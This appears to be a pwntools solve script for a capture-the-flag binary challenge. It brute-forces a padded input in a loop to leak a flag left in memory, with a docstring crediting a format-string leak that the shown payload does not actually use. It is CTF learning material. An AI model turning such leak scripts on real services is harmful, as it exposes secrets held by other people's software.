from pwn import *
from grwnapy.pwn import find_offset

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, b"300\n"+cyclic(500))
# win = elf.symbols['win']
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])

""" DESC
Leak data left behind unintentionally by utilizing clever payload construction.

The challenge flavortext and tutorial is misleading. The point of the challenge is not to jump to win_authed()
But to abuse format strings (specifically %s) in the "you said:" print to print out the residual flag.
The offset for the flag can be brute-forced using a while loop that detects flag inside io.recvall() 

Walkthrough

"""

payload = flat([b"500"])
offset = 1

while True:
    io = start()
    io.sendline(payload)

    payload += flat([b"A"*offset])
    offset += 1

    io.sendline(payload)

    data = io.recvall()
    if b"pwn" in data:
        print(data)
        break

"""
Things Learned:
win functions can be a lie
brute-forcing pwns can be fun :)
"""
